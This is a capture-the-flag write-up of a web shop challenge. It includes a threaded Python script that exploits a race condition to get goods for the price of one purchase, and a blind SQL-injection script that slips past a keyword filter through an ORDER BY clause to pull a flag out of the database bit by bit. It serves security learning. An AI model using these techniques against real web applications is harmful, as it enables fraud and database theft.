In this web application, users can register, login, buy and sale goods.
Every user have 4000 money at init, but ``!HINT!`` need 8000, after try some times, we can know this site have race condition vulnerability. We can get many money with following script.

```python
import requests
import threading


url = "http://202.120.7.197/app.php"

def buy1():
    s = requests.Session()
    params = {"action": "login"}
    data = {
        "username": "vvv",
        "pwd": "vvv"
    }

    r = s.post(url, params=params, data=data)
    params = {
        "action": "sale",
        "id": "1"
    }

    r = s.get(url, params=params)
    print r.content


threads = []

for i in range(4):
    t1 = threading.Thread(target=buy1, args=())
    threads.append(t1)


if __name__ == '__main__':
    for t in threads:
        t.setDaemon(True)
        t.start()

    t.join()
```

After run this script, we will buy many goods, but only cost 1 time, so after we sale those goods, we can get hint: ``OK! Now I will give some hint: you can get flag by use select flag from ce63e444b0d049e9c899c9a0336b3c59``.

Try with search condition, we can know there has a SQLi vulnerability, but there is a WAF which reject ``/[^a-zA-Z0-9,()&]|\(\)|\s/`` and many keywords.

The final exploit is here

```
import requests
import hashlib

def md5(s):
    return hashlib.md5(str(s)).hexdigest()

url = "http://202.120.7.197/app.php"

s = requests.Session()

params = {"action": "login"}

data = {
    "username": "vvv",
    "pwd": "vvv"
}

r = s.post(url, params=params, data=data)

params = {
    "action" : "search",
    "keyword" : "i",
}

mid = 256
pos = 1
guess = 0
content = ''

while pos < 32:

    mid /= 2

    params["order"] = "if(((ascii(mid((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),%d,1))&%d)),name,price)" % (pos, mid)
    if mid == 0:
        mid = 256
        pos += 1
        content += chr(guess)
        print 'flag: ', content
        guess = 0
    else:
        r = s.get(url, params=params)
        if r.status_code != 200:
            mid *= 2
            continue
        guess <<= 1
        guess += md5(r.content) != "38477ac7411a03638d60adb6e8b46665"

```